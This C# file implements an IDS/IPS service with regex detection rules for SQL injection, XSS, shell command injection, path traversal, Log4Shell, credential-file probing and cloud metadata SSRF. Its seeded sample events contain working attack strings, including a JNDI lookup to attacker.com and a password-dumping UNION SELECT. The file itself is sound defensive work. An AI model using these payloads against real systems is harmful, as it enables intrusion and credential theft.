using System.Collections.Concurrent;
using System.Text.RegularExpressions;
using vulnerability_management.Models;

namespace vulnerability_management.Services;

public interface IIdsIpsService
{
    IdsIpsMode Mode { get; }
    void SetMode(IdsIpsMode mode);

    (bool IsAllowed, IdsIpsEvent? Event) InspectRequest(string sourceIp, string method, string path, string queryString, string body, string userAgent);
    IdsIpsEvent SimulateAttack(AttackSimulationRequest request);

    void BanIp(string ip, string reason, int durationMinutes = 60, int triggeredSid = 0);
    void UnbanIp(string ip);
    void ToggleRule(int sid, bool enabled);
    void ClearBans();
    void ClearEvents();

    IdsIpsSummaryViewModel GetSummary();
}

public class IdsIpsService : IIdsIpsService
{
    private readonly ILogger<IdsIpsService> _logger;
    private IdsIpsMode _mode = IdsIpsMode.IPS_ActivePrevention;

    private long _totalInspected = 0;
    private long _totalAlerts = 0;
    private long _totalBlocks = 0;

    private readonly ConcurrentDictionary<string, BannedIpEntry> _bannedIps = new(StringComparer.OrdinalIgnoreCase);
    private readonly ConcurrentQueue<IdsIpsEvent> _events = new();
    private readonly List<IdsRule> _rules = new();
    private readonly List<(IdsRule Rule, Regex CompiledRegex)> _compiledRules = new();
    private readonly object _ruleLock = new();

    public IdsIpsMode Mode => _mode;

    public IdsIpsService(ILogger<IdsIpsService> logger)
    {
        _logger = logger;
        InitializeDefaultRules();
        SeedInitialSampleEvents();
    }

    private void InitializeDefaultRules()
    {
        _rules.AddRange(new[]
        {
            new IdsRule
            {
                Sid = 10001,
                Name = "SQL Injection (SQLi) Signature Match",
                Category = "Web Application",
                Severity = AttackSeverity.Critical,
                PatternRegex = @"(?i)(\b(union\s+all\s+select|union\s+select)\b|'\s*or\s*'1'\s*=\s*'1|;\s*drop\s+table|\bxp_cmdshell\b|--\s*$|information_schema\.tables|\bwaitfor\s+delay\b|\bsleep\(\d+\))",
                DefaultAction = IpsAction.Blocked,
                Description = "Detects boolean-based, UNION-based, and stacked SQL query injections targeting backend database engines.",
                MitreAttackId = "T1190"
            },
            new IdsRule
            {
                Sid = 10002,
                Name = "Cross-Site Scripting (XSS) Vector",
                Category = "Web Application",
                Severity = AttackSeverity.High,
                PatternRegex = @"(?i)(<\s*script.*?>|javascript\s*:\s*|onerror\s*=\s*|onload\s*=\s*|<\s*iframe\b|<\s*img\s+src=.*?onerror\s*=|document\.cookie)",
                DefaultAction = IpsAction.Blocked,
                Description = "Identifies reflected or DOM-based client script injection attempts in headers, query strings, and payloads.",
                MitreAttackId = "T1059.007"
            },
            new IdsRule
            {
                Sid = 10003,
                Name = "Remote Code Execution (RCE) / Command Injection",
                Category = "Exploit / RCE",
                Severity = AttackSeverity.Critical,
                PatternRegex = @"(?i)(;\s*(whoami|ipconfig|ifconfig|id|cat\s+/etc/passwd|powershell|cmd\.exe|wget\s+|curl\s+|bash\s+-i|nc\s+-e)|\bexec\s*\(|`.*?`|\$\(.*?\))",
                DefaultAction = IpsAction.Blocked,
                Description = "Detects shell metacandidate separators and command execution binaries attempting OS shell spawning.",
                MitreAttackId = "T1059"
            },
            new IdsRule
            {
                Sid = 10004,
                Name = "Path Traversal & Local File Inclusion (LFI)",
                Category = "Reconnaissance",
                Severity = AttackSeverity.High,
                PatternRegex = @"(?i)(\.\./\.\./|\.\.\\\.\.\\|/etc/passwd|/windows/win\.ini|boot\.ini|\.\.%2f|\.\.%5c)",
                DefaultAction = IpsAction.Blocked,
                Description = "Detects directory traversal sequences attempting unauthorized access to operating system configuration and credential files.",
                MitreAttackId = "T1083"
            },
            new IdsRule
            {
                Sid = 10005,
                Name = "Log4Shell / JNDI Remote Code Execution",
                Category = "Exploit / RCE",
                Severity = AttackSeverity.Critical,
                PatternRegex = @"(?i)\$\{jndi:(ldap|rmi|dns|nis|iiop|corba|http)://",
                DefaultAction = IpsAction.Blocked,
                Description = "Detects Apache Log4j JNDI lookup strings (CVE-2021-44228) used to trigger remote class loading and arbitrary code execution.",
                MitreAttackId = "T1190"
            },
            new IdsRule
            {
                Sid = 10006,
                Name = "Automated Reconnaissance & Security Scanner User-Agent",
                Category = "Scanning",
                Severity = AttackSeverity.Medium,
                PatternRegex = @"(?i)\b(sqlmap|nikto|nmap|masscan|dirbuster|gobuster|wpscan|nuclei|zgrab|censys|shodan|acunetix|nessus|openvas)\b",
                DefaultAction = IpsAction.Blocked,
                Description = "Identifies automated offensive vulnerability scanners, directory fuzzers, and internet-wide reconnaissance crawlers.",
                MitreAttackId = "T1595"
            },
            new IdsRule
            {
                Sid = 10007,
                Name = "Sensitive Environment & Dotfile Probing",
                Category = "Reconnaissance",
                Severity = AttackSeverity.High,
                PatternRegex = @"(?i)(/\.env|/\.git/config|/\.aws/credentials|/id_rsa|/id_dsa|/wp-config\.php|/backup\.(sql|tar|zip)|\.bash_history)",
                DefaultAction = IpsAction.Blocked,
                Description = "Detects probes targeting secrets, source control repositories, SSH private keys, and cloud credential files.",
                MitreAttackId = "T1552"
            },
            new IdsRule
            {
                Sid = 10008,
                Name = "Server-Side Request Forgery (SSRF) Cloud Metadata Probe",
                Category = "Web Application",
                Severity = AttackSeverity.Critical,
                PatternRegex = @"(?i)(http://169\.254\.169\.254/latest/meta-data|http://metadata\.google\.internal|http://127\.0\.0\.1:2375)",
                DefaultAction = IpsAction.Blocked,
                Description = "Detects attempts to query AWS/GCP/Azure instance metadata endpoints to harvest IAM instance credentials.",
                MitreAttackId = "T1557"
            },
            new IdsRule
            {
                Sid = 10009,
                Name = "PowerShell Encoded Command Payload",
                Category = "Exploit / RCE",
                Severity = AttackSeverity.Critical,
                PatternRegex = @"(?i)powershell.*(-e|-enc|-encodedcommand)\s+[a-z0-9+/=]{20,}",
                DefaultAction = IpsAction.Blocked,
                Description = "Detects Base64-obfuscated PowerShell payloads used to bypass basic string detection and execute staged shellcode.",
                MitreAttackId = "T1059.001"
            }
        });

        RecompileRules();
    }

    private void RecompileRules()
    {
        lock (_ruleLock)
        {
            _compiledRules.Clear();
            foreach (var r in _rules.Where(r => r.IsEnabled))
            {
                try
                {
                    var regex = new Regex(r.PatternRegex, RegexOptions.Compiled | RegexOptions.IgnoreCase, TimeSpan.FromMilliseconds(200));
                    _compiledRules.Add((r, regex));
                }
                catch (Exception ex)
                {
                    _logger.LogWarning(ex, "Failed to compile regex for rule SID {Sid}", r.Sid);
                }
            }
        }
    }

    public void SetMode(IdsIpsMode mode)
    {
        _mode = mode;
        _logger.LogInformation("IDS/IPS Engine operational mode changed to: {Mode}", mode);
    }

    public (bool IsAllowed, IdsIpsEvent? Event) InspectRequest(
        string sourceIp, string method, string path, string queryString, string body, string userAgent)
    {
        Interlocked.Increment(ref _totalInspected);

        // 1. Check if IP is in active ban list
        if (_bannedIps.TryGetValue(sourceIp, out var ban) && ban.IsActive)
        {
            Interlocked.Increment(ref _totalBlocks);
            var dropEvent = new IdsIpsEvent
            {
                SourceIp = sourceIp,
                Method = method,
                TargetPath = path,
                MatchedSid = ban.TriggeredSid,
                RuleName = $"Active IP Blacklist: {ban.Reason}",
                Category = "Access Control",
                Severity = AttackSeverity.Critical,
                ActionTaken = IpsAction.Dropped,
                PayloadSnippet = "Connection dropped due to active blacklisted IP policy.",
                UserAgent = userAgent,
                MitreAttackId = "T1190"
            };
            RecordEvent(dropEvent);
            return (false, dropEvent);
        }

        // Clean expired bans
        if (ban != null && !ban.IsActive)
        {
            _bannedIps.TryRemove(sourceIp, out _);
        }

        // 2. Evaluate request against compiled IDS/IPS rules
        string combinedBuffer = $"{path} {queryString} {body} {userAgent}";

        List<(IdsRule Rule, Regex CompiledRegex)> activeRules;
        lock (_ruleLock)
        {
            activeRules = _compiledRules.ToList();
        }

        foreach (var (rule, regex) in activeRules)
        {
            try
            {
                var match = regex.Match(combinedBuffer);
                if (match.Success)
                {
                    var action = _mode == IdsIpsMode.IPS_ActivePrevention ? IpsAction.Blocked : IpsAction.Alerted;
                    if (action == IpsAction.Blocked)
                    {
                        Interlocked.Increment(ref _totalBlocks);
                        // Auto-ban attacker IP for 60 minutes on critical attacks
                        if (rule.Severity == AttackSeverity.Critical && sourceIp != "127.0.0.1" && sourceIp != "::1")
                        {
                            BanIp(sourceIp, $"Automatic IPS ban triggered by rule [{rule.Name}]", 60, rule.Sid);
                        }
                    }
                    else
                    {
                        Interlocked.Increment(ref _totalAlerts);
                    }

                    var idsEvent = new IdsIpsEvent
                    {
                        SourceIp = sourceIp,
                        Method = method,
                        TargetPath = path,
                        MatchedSid = rule.Sid,
                        RuleName = rule.Name,
                        Category = rule.Category,
                        Severity = rule.Severity,
                        ActionTaken = action,
                        PayloadSnippet = match.Value.Length > 120 ? match.Value[..120] + "..." : match.Value,
                        UserAgent = userAgent,
                        MitreAttackId = rule.MitreAttackId
                    };

                    RecordEvent(idsEvent);

                    if (action == IpsAction.Blocked)
                    {
                        return (false, idsEvent);
                    }
                }
            }
            catch (RegexMatchTimeoutException)
            {
                _logger.LogWarning("Regex match timeout on rule SID {Sid}", rule.Sid);
            }
        }

        return (true, null);
    }

    public IdsIpsEvent SimulateAttack(AttackSimulationRequest request)
    {
        var (allowed, ev) = InspectRequest(
            request.SourceIp, "POST", request.TargetPath, "", request.Payload, request.UserAgent);

        if (ev != null)
        {
            return ev;
        }

        // If not matched by standard rules, generate clean inspection log
        var cleanEvent = new IdsIpsEvent
        {
            SourceIp = request.SourceIp,
            Method = "POST",
            TargetPath = request.TargetPath,
            MatchedSid = 0,
            RuleName = "Clean Request (No Threats Detected)",
            Category = "Traffic Inspection",
            Severity = AttackSeverity.Info,
            ActionTaken = IpsAction.Alerted,
            PayloadSnippet = request.Payload.Length > 80 ? request.Payload[..80] + "..." : request.Payload,
            UserAgent = request.UserAgent
        };
        RecordEvent(cleanEvent);
        return cleanEvent;
    }

    public void BanIp(string ip, string reason, int durationMinutes = 60, int triggeredSid = 0)
    {
        var entry = new BannedIpEntry
        {
            IpAddress = ip.Trim(),
            BannedAt = DateTime.UtcNow,
            ExpiresAt = durationMinutes > 0 ? DateTime.UtcNow.AddMinutes(durationMinutes) : null,
            Reason = reason,
            TriggeredSid = triggeredSid
        };
        _bannedIps[ip.Trim()] = entry;
        _logger.LogWarning("IPS Dynamic Blacklist: Banned IP {Ip} for {Minutes}m. Reason: {Reason}", ip, durationMinutes, reason);
    }

    public void UnbanIp(string ip)
    {
        _bannedIps.TryRemove(ip.Trim(), out _);
        _logger.LogInformation("Unbanned IP {Ip}", ip);
    }

    public void ToggleRule(int sid, bool enabled)
    {
        var r = _rules.FirstOrDefault(x => x.Sid == sid);
        if (r != null)
        {
            r.IsEnabled = enabled;
            RecompileRules();
        }
    }

    public void ClearBans()
    {
        _bannedIps.Clear();
    }

    public void ClearEvents()
    {
        while (_events.TryDequeue(out _)) { }
    }

    private void RecordEvent(IdsIpsEvent ev)
    {
        _events.Enqueue(ev);
        while (_events.Count > 1000)
        {
            _events.TryDequeue(out _);
        }
    }

    public IdsIpsSummaryViewModel GetSummary()
    {
        return new IdsIpsSummaryViewModel
        {
            Mode = _mode,
            TotalInspected = _totalInspected,
            TotalAlerts = _totalAlerts,
            TotalBlocks = _totalBlocks,
            ActiveBansCount = _bannedIps.Values.Count(b => b.IsActive),
            RecentEvents = _events.Reverse().Take(50).ToList(),
            BannedIps = _bannedIps.Values.Where(b => b.IsActive).OrderByDescending(b => b.BannedAt).ToList(),
            Rules = _rules.ToList()
        };
    }

    private void SeedInitialSampleEvents()
    {
        // Seed some representative IDS/IPS threat telemetry events
        RecordEvent(new IdsIpsEvent
        {
            Timestamp = DateTime.UtcNow.AddMinutes(-42),
            SourceIp = "185.220.101.5",
            Method = "GET",
            TargetPath = "/api/v1/users?id=1%20UNION%20SELECT%20null,username,password%20FROM%20users",
            MatchedSid = 10001,
            RuleName = "SQL Injection (SQLi) Signature Match",
            Category = "Web Application",
            Severity = AttackSeverity.Critical,
            ActionTaken = IpsAction.Blocked,
            PayloadSnippet = "UNION SELECT null,username,password FROM users",
            UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            MitreAttackId = "T1190"
        });

        RecordEvent(new IdsIpsEvent
        {
            Timestamp = DateTime.UtcNow.AddMinutes(-27),
            SourceIp = "45.154.255.89",
            Method = "GET",
            TargetPath = "/search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E",
            MatchedSid = 10002,
            RuleName = "Cross-Site Scripting (XSS) Vector",
            Category = "Web Application",
            Severity = AttackSeverity.High,
            ActionTaken = IpsAction.Blocked,
            PayloadSnippet = "<script>alert(document.cookie)</script>",
            UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            MitreAttackId = "T1059.007"
        });

        RecordEvent(new IdsIpsEvent
        {
            Timestamp = DateTime.UtcNow.AddMinutes(-14),
            SourceIp = "194.26.29.112",
            Method = "GET",
            TargetPath = "/.env",
            MatchedSid = 10007,
            RuleName = "Sensitive Environment & Dotfile Probing",
            Category = "Reconnaissance",
            Severity = AttackSeverity.High,
            ActionTaken = IpsAction.Blocked,
            PayloadSnippet = "/.env",
            UserAgent = "sqlmap/1.6#stable (https://sqlmap.org)",
            MitreAttackId = "T1552"
        });

        RecordEvent(new IdsIpsEvent
        {
            Timestamp = DateTime.UtcNow.AddMinutes(-5),
            SourceIp = "91.240.118.230",
            Method = "POST",
            TargetPath = "/login",
            MatchedSid = 10005,
            RuleName = "Log4Shell / JNDI Remote Code Execution",
            Category = "Exploit / RCE",
            Severity = AttackSeverity.Critical,
            ActionTaken = IpsAction.Blocked,
            PayloadSnippet = "${jndi:ldap://attacker.com:1389/Exploit}",
            UserAgent = "curl/7.68.0",
            MitreAttackId = "T1190"
        });

        _bannedIps["185.220.101.5"] = new BannedIpEntry
        {
            IpAddress = "185.220.101.5",
            BannedAt = DateTime.UtcNow.AddMinutes(-42),
            ExpiresAt = DateTime.UtcNow.AddHours(23),
            Reason = "Automatic IPS ban: Critical SQL Injection exploitation attempt",
            TriggeredSid = 10001
        };

        _bannedIps["91.240.118.230"] = new BannedIpEntry
        {
            IpAddress = "91.240.118.230",
            BannedAt = DateTime.UtcNow.AddMinutes(-5),
            ExpiresAt = DateTime.UtcNow.AddHours(24),
            Reason = "Automatic IPS ban: Log4Shell RCE payload injection",
            TriggeredSid = 10005
        };

        _totalInspected = 1420;
        _totalAlerts = 28;
        _totalBlocks = 35;
    }
}
